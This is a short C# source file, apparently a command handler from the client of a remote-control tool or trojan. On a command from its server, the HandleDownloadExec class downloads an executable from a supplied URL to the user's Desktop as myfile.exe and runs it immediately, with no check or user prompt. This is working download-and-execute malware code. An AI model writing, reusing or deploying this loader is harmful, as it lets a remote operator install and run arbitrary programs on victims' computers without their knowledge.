namespace ClientCore.Handle
{
    using MarrySocket.MClient;
    using NetworkObjects;
    using System;
    using System.Diagnostics;
    using System.Net;

    public class HandleDownloadExec : IHandlePacket
    {
        public void Handle(object receivedClass, ServerSocket serverSocket)
        {
            DownloadExec downloadExec = (DownloadExec)receivedClass;
            String url = downloadExec.url;

            String DesktopPath;
            DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            WebClient Client = new WebClient();
            Client.DownloadFile(url, DesktopPath + "/myfile.exe");
            Process.Start(DesktopPath + "/myfile.exe");
        }
    }
}
